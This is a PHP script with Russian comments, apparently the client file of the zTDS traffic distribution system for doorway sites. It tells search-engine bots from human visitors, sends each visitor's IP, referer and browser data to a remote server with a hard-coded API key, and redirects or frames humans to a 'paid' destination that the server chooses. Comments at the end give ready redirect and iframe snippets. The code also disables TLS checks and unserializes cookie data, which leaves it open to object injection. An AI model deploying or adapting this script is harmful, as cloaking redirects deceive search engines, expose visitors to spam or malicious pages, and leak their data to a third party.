<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@date_default_timezone_set('UTC');
$z_test_config = $z_mode = '';
/*config*/
$z_url = 'https://on.nzpb.ru';//ссылка на TDS
$z_key_api_host = '9de503ce55111f24b346ad3d5bd51de3';//API ключ
$z_conf_edit = 0;//разрешить редактирование конфига из админки TDS (0/1)
$z_conf_file = 'api.ini';//название файла с конфигом (переименуйте!)
$z_allow_ip = '';//разрешить редактирование конфига только с этого IP (IP сервера с zTDS)
$z_get = 'prt';//название GET переменной для go.php (http://doorway.com/go.php?q=keyword)
$z_timeout = 10;//таймаут соединения в секундах (только для curl)
if($z_conf_edit == 1 && file_exists($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file)){$z_test_config = 1;}
if(!empty($_GET[$z_get])){$z_key = trim($_GET[$z_get]);$z_mode = 1;$z_conf_edit = 0;}
if($z_conf_edit == 0 || ($z_conf_edit == 1 && empty($z_test_config))){
	$z_conf = array();
	$z_conf['id'] = 'pf-book-del-sol';//ID группы
	$z_conf['sub_del'] = 0;//удалять поддомены
	$z_conf['cf_ip'] = 0;//определять IP посетителя по $_SERVER['HTTP_CF_CONNECTING_IP'] (0/1)
	$z_conf['em_referer'] = 0;//если пустой реферер - это бот (0/1)
	$z_conf['em_useragent'] = 1;//если пустой юзерагент - это бот (0/1)
	$z_conf['em_lang'] = 1;//если пустой язык браузера - это бот (0/1)
	$z_conf['ipv6'] = 0;//если IP адрес IPV6 - это бот (0/1)
	$z_conf['ptr'] = 0;//проверять PTR запись (0/1)
	$z_conf['rd_bots'] = 0;//запрашивать с TDS данные для ботов (0/1)
	$z_conf['rd_se'] = 0;//запрашивать с TDS данные только для посетителей из ПС (0/1)
	$z_conf['method'] = 0;//метод передачи данных (0 - GET; 1 - POST;)
	$z_conf['conf_lc'] = date('d.m.Y H:i:s');//дата и время последнего изменения конфига
	$z_conf['status'] = 1;//off/on (0/1)
	$z_conf['ip_serv_seodor'] = '';//IP серверной части SEoDOR
	$z_conf['sign_ref'] = htmlentities('iframe-toloka.com,hghltd.yandex.net', ENT_QUOTES, 'UTF-8');//признаки ботов в реферере
	$z_conf['sign_ua'] = htmlentities('ahrefs,aport,ask,bot,btwebclient,butterfly,commentreader,copier,crawler,crowsnest,curl,disco,ezooms,fairshare,httrack,ia_archiver,internetseer,java,js-kit,larbin,libwww,linguee,linkexchanger,lwp-trivial,netvampire,nigma,ning,nutch,offline,peerindex,pingadmin,postrank,rambler,semrush,slurp,soup,spider,sweb,teleport,twiceler,voyager,wget,wordpress,yeti,zeus', ENT_QUOTES, 'UTF-8');//признаки ботов в юзерагенте
/*Ниже ничего не изменяйте*/
	if($z_conf_edit == 1 && empty($z_test_config)){
		$z_conf_default = serialize($z_conf);
		file_put_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file, $z_conf_default, LOCK_EX);
		$z_conf = unserialize(file_get_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file));
	}
}
if($z_conf_edit == 1 && !empty($z_test_config)){
	$z_conf = unserialize(file_get_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file));
}
//редактирование конфига
//чтение
if($z_conf_edit == 1 && !empty($_GET['key']) && $_GET['key'] == $z_key_api_host && empty($_GET['conf'])){
	if(!z_ip_check($z_allow_ip)){
		header('HTTP/1.0 404 Not Found', true, 404);
		exit();
	}
	echo serialize($z_conf);
	exit();
}
//запись
if($z_conf_edit == 1 && !empty($_GET['key']) && $_GET['key'] == $z_key_api_host && !empty($_GET['conf'])){
	if(!z_ip_check($z_allow_ip)){
		header('HTTP/1.0 404 Not Found', true, 404);
		exit();
	}
	$z_conf = base64_decode($_GET['conf']);
	$z_conf_tmp = @unserialize($z_conf);
	if(is_array($z_conf_tmp)){
		file_put_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file, $z_conf, LOCK_EX);
	}
	exit();
}
//
$z_out = $z_lang = $z_country = $z_city = $z_region = $z_asn = $z_org = $z_device = $z_operator = $z_os_name = $z_os_version = $z_browser_name = $z_browser_version = $z_macros = $z_cookies_data = '';
$z_empty = $z_bot = '-';
$z_uniq = 'yes';
//chrome prefetch
if(isset($_SERVER['HTTP_PURPOSE']) && $_SERVER['HTTP_PURPOSE'] == 'prefetch'){
	$z_conf['status'] = 0;
}
if($z_conf['status'] == 1){
//useragent
	$z_useragent = $z_empty;
	if(!empty($_SERVER['HTTP_USER_AGENT'])){
		$z_useragent = $_SERVER['HTTP_USER_AGENT'];
	}
	elseif($z_conf['em_useragent'] == 1){
		$z_bot = 'empty_ua';
	}
//referer && se
	$z_referer = $z_empty;
	$z_se = $z_empty;
	if(!empty($_SERVER['HTTP_REFERER'])){
		$z_referer = $_SERVER['HTTP_REFERER'];
		if(strstr($z_referer, 'google.')){$z_se = 'google';}
		if(strstr($z_referer, 'yandex.') || strstr($z_referer, '/ya.ru')){$z_se = 'yandex';}
		if(strstr($z_referer, 'mail.ru')){$z_se = 'mail';}
		if(strstr($z_referer, 'yahoo.com')){$z_se = 'yahoo';}
		if(strstr($z_referer, 'bing.com')){$z_se = 'bing';}
		if(strstr($z_referer, 'baidu.com')){$z_se = 'baidu';}
	}
	elseif($z_bot == $z_empty && $z_conf['em_referer'] == 1){
		$z_bot = 'empty_ref';
	}
//ловим ботов по признакам в реферере
	if($z_bot == $z_empty && $z_referer != $z_empty && !empty($z_conf['sign_ref'])){
		$z_ex = explode(',', $z_conf['sign_ref']);
		foreach($z_ex as $z_value){
			$z_value = trim(html_entity_decode($z_value, ENT_QUOTES, 'UTF-8'));
			if(strstr($z_referer, $z_value)){
				$z_bot = 'sign_ref';
				break;
			}
		}
	}
//ловим ботов по данным в юзерагенте
	if(stristr($z_useragent, 'baidu.com')){$z_bot = 'baidu';}
	if(stristr($z_useragent, 'bing.com') || stristr($z_useragent, 'msnbot')){$z_bot = 'bing';}
	if(stristr($z_useragent, 'google.')){$z_bot = 'google';}
	if(stristr($z_useragent, 'mail.ru')){$z_bot = 'mail';}
	if(stristr($z_useragent, 'yahoo.com')){$z_bot = 'yahoo';}
	if(stristr($z_useragent, 'yandex.com/bots')){$z_bot = 'yandex';}
	if(stristr($z_useragent, 'facebook')){$z_bot = 'facebook';}
	if($z_bot == $z_empty && $z_useragent != $z_empty && !empty($z_conf['sign_ua'])){
		$z_ex = explode(',', $z_conf['sign_ua']);
		foreach($z_ex as $z_value){
			$z_value = trim(html_entity_decode($z_value, ENT_QUOTES, 'UTF-8'));
			if(stristr($z_useragent, $z_value)){
				$z_bot = 'sign_ua';
				break;
			}
		}
	}
//cf country
	$z_cf_country = $z_empty;
	if(!empty($_SERVER['HTTP_CF_IPCOUNTRY'])){
		$z_cf_country = strtolower($_SERVER['HTTP_CF_IPCOUNTRY']);
	}
//ip
	if($z_conf['cf_ip'] == 1 && !empty($_SERVER['HTTP_CF_CONNECTING_IP'])){
		$z_ipuser = $_SERVER['HTTP_CF_CONNECTING_IP'];
	}
	if($z_conf['cf_ip'] == 0 || empty($z_ipuser)){
		if(!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], '.') > 0 || strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ':') > 0)){
			if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') > 0){
				$z_ipuser = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
				$z_ipuser = trim($z_ipuser[0]);
			}
			elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') === false){
				if(empty($z_conf['ip_serv_seodor'])){
					$z_ipuser = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
				}
			}
		}
		if(empty($z_ipuser)){
			$z_ipuser = trim($_SERVER['REMOTE_ADDR']);
		}
	}
//azure.microsoft.com
	if(!filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && stristr($z_ipuser, ':')){
		$z_exp = explode(':', $z_ipuser);
		$z_ipuser = $z_exp[0];
	}
	if(!filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_ipuser = $z_empty;
	}
//ipv6
	if($z_bot == $z_empty && $z_conf['ipv6'] == 1 && filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_bot = 'ipv6';
	}
//ptr
	if($z_bot == $z_empty && $z_conf['ptr'] == 1){
		$z_ptr_rec = gethostbyaddr($z_ipuser);
		if(stristr($z_ptr_rec, 'baidu')){$z_bot = 'baidu';}
		if(stristr($z_ptr_rec, 'bing') || stristr($z_ptr_rec, 'msnbot')){$z_bot = 'bing';}
		if(stristr($z_ptr_rec, 'google') && !stristr($z_ptr_rec, 'googlefiber')){$z_bot = 'google';}
		if(stristr($z_ptr_rec, 'mail.ru')){$z_bot = 'mail';}
		if(stristr($z_ptr_rec, 'yahoo')){$z_bot = 'yahoo';}
		if(stristr($z_ptr_rec, 'yandex')){$z_bot = 'yandex';}
	}
//lang
	$z_lang = $z_empty;
	if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
		$z_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	}
	if($z_lang == $z_empty && $z_conf['em_lang'] == 1){
		$z_bot = 'empty_lang';
	}
//domain
	$z_domain = $_SERVER['HTTP_HOST'];
	if($z_conf['sub_del'] == 1 && substr_count($z_domain, '.') > 1){
		preg_match("~^.+?\.(.+?)$~", $z_domain, $matches);
		$z_domain = $matches[1];
	}
//page
	$z_page = $_SERVER['REQUEST_URI'];
//page url
	$z_page_url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	if(($z_bot == $z_empty || $z_conf['rd_bots'] == 1) && $z_ipuser != $z_empty){
		$z_n_cookies = md5($_SERVER['HTTP_HOST'].'+'.$z_conf['id']);
		if(isset($_COOKIE[$z_n_cookies])){
			$z_cookies_data = unserialize(base64_decode($_COOKIE[$z_n_cookies]));
		}
//упаковываем данные
		if(!isset($z_key)){$z_key = '';}
		if(empty($z_options)){$z_options = array();}
		$z_request = array();
		$z_request[0] = trim($z_key_api_host);
		$z_request[1] = trim($z_conf['id']);
		$z_request[2] = trim($z_ipuser);
		$z_request[3] = trim($z_referer);
		$z_request[4] = trim($z_useragent);
		$z_request[5] = $z_se;
		$z_request[6] = trim($z_lang);
		$z_request[7] = urlencode(trim($z_key));
		$z_request[8] = trim($z_domain);
		$z_request[9] = trim($z_page);
		$z_request[10] = trim($z_cf_country);
		$z_request[11] = $z_options;
		$z_request[12] = $z_cookies_data;
		if($z_conf['method'] == 1){
			$z_data['api'] = serialize($z_request);
		}
		else{
			$z_url = $z_url.'/?api='.base64_encode(serialize($z_request));
		}
		if((empty($z_conf['ip_serv_seodor']) || $z_ipuser != $z_conf['ip_serv_seodor']) && ($z_conf['rd_se'] == 0 || ($z_conf['rd_se'] == 1 && $z_se != $z_empty))){
//отправляем
			$z_ch = curl_init();
			curl_setopt($z_ch, CURLOPT_TIMEOUT, $z_timeout);
			curl_setopt($z_ch, CURLOPT_URL, $z_url);
			curl_setopt($z_ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($z_ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($z_ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($z_ch, CURLOPT_SSL_VERIFYHOST, 0);
			if($z_conf['method'] == 1){
				curl_setopt($z_ch, CURLOPT_POST, true);
				curl_setopt($z_ch, CURLOPT_POSTFIELDS, $z_data);
			}
			curl_setopt($z_ch, CURLOPT_USERAGENT, 'zTDS');
			$z_response = curl_exec($z_ch);
			curl_close($z_ch);
//распаковываем
			$z_response = @unserialize($z_response);
//обработка ответа
			if(is_array($z_response)){
				$z_out = trim(html_entity_decode($z_response[0], ENT_QUOTES, 'UTF-8'));
				$z_country = $z_response[1];
				$z_region = $z_response[2];
				$z_city = $z_response[3];
				$z_asn = $z_response[4];
				$z_org = $z_response[5];
				$z_device = $z_response[6];
				$z_operator = $z_response[7];
				$z_bot = $z_response[8];
				$z_uniq = $z_response[9];
				$z_lang = $z_response[10];
				$z_macros = trim(html_entity_decode($z_response[11], ENT_QUOTES, 'UTF-8'));
				$z_os_name = $z_response[12];
				$z_os_version = $z_response[13];
				$z_br_name = $z_response[14];
				$z_br_version = $z_response[15];
				$z_brand = $z_response[16];
				$z_cookies = $z_response[17];
//SetCookie(name, value, expire, path, domain, secure, httponly);
				if(!empty($z_cookies)){
					$z_cookies_options = array('expires'=>$z_cookies[3], 'path'=>'/', 'domain'=>'', 'secure'=>0, 'httponly'=>1, 'samesite'=>'Lax');
					if(phpversion() >= 7.3 == 1){
						SetCookie($z_n_cookies, base64_encode(serialize($z_cookies)), $z_cookies_options);
					}
					else{
						SetCookie($z_n_cookies, base64_encode(serialize($z_cookies)), $z_cookies[3], '/', '', 0, 1);
					}
				}
//обработка макросов
				if(strstr($z_out, '[RAWURLENCODE_REFERER]')){
					$z_out = str_replace('[RAWURLENCODE_REFERER]', rawurlencode($z_referer), $z_out);
				}
				if(strstr($z_out, '[URLENCODE_REFERER]')){
					$z_out = str_replace('[URLENCODE_REFERER]', urlencode($z_referer), $z_out);
				}
				if(strstr($z_out, '[RAWURLENCODE_PAGE_URL]')){
					$z_out = str_replace('[RAWURLENCODE_PAGE_URL]', rawurlencode($z_page_url), $z_out);
				}
				if(strstr($z_out, '[URLENCODE_PAGE_URL]')){
					$z_out = str_replace('[URLENCODE_PAGE_URL]', urlencode($z_page_url), $z_out);
				}
//go.php
				if(!empty($z_mode)){
					if(!empty($z_out)){
						header("Location: $z_out");
						exit();
					}
					else{
						header('HTTP/1.0 404 Not Found', true, 404);
						exit();
					}
				}
				/* Здесь можно прописать нужный вам код (см. ниже) */
			}
		}
	}
}
//блокировка по IP
function z_ip_check($z_allow_ip){
	if(!empty($z_allow_ip)){
		if(!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], '.') > 0 || strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ':') > 0)){
			if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') > 0){
				$z_ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
				$z_ip = trim($z_ip[0]);
			}
			elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') === false){
				$z_ip = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
			}
		}
		else{
			$z_ip = trim($_SERVER['REMOTE_ADDR']);
		}
		if($z_ip == trim($z_allow_ip)){
			return true;
		}
	}
	else{
		return true;
	}
}
/*
Если ротатор выключен, аутом будет первый URL, уникальность "по cookies" работать не будет
Переменные    | возможные данные
------------------------------
$z_out        | ссылка на платник/код или пусто
$z_lang       | язык браузера или $z_empty
$z_country    | код страны или $z_empty
$z_city       | город или $z_empty
$z_region     | код региона или $z_empty
$z_asn        | ASN или $z_empty
$z_org        | название организации или $z_empty
$z_device     | computer, tablet, phone, other
$z_brand      | название бренда мобильного устройства или $z_empty
$z_operator   | beeline, megafon, mts, tele2, azerbaijan, belarus, kazakhstan, ukraine, wap-1, wap-2, wap-3 или $z_empty
$z_bot        | название бота или $z_empty
$z_uniq       | yes, no
$z_macros     | результат обработки макросов или пусто
$z_os_name    | название OS или $z_empty
$z_os_version | версия OS или $z_empty
$z_br_name    | название браузера или $z_empty
$z_br_version | версия браузера или $z_empty
$z_brand      | название бренда мобильного устройства или $z_empty
*/
/*
В некоторых случаях можно прописывать код редиректа или фрейма внутри api.php
Примеры кода:
1. Редирект WAP трафика
if($z_operator != $z_empty && $z_bot == $z_empty && !empty($z_out)){header("Location: $z_out");}
2. Сгенерировать и показать страницу с фреймом, для всех кроме ботов
if($z_bot == $z_empty && !empty($z_out)){echo '<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_out.'"></frameset></html>';exit();}
3. Управление типом слива из админки TDS
if($z_bot == $z_empty && !empty($z_out) && strstr($z_out, ';')){
	$z_ex = explode(';', $z_out);
	$z_type = trim($z_ex[0]);
	$z_link = trim($z_ex[1]);
	if($z_type == 'redirect'){header("Location: $z_link");exit();}
	if($z_type == 'iframe'){echo '<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_link.'"></frameset></html>';exit();}
}
Для редиректа пропишите в ауте: redirect;http://platnik.ru
Для фрейма: iframe;http://platnik.ru
*/
?>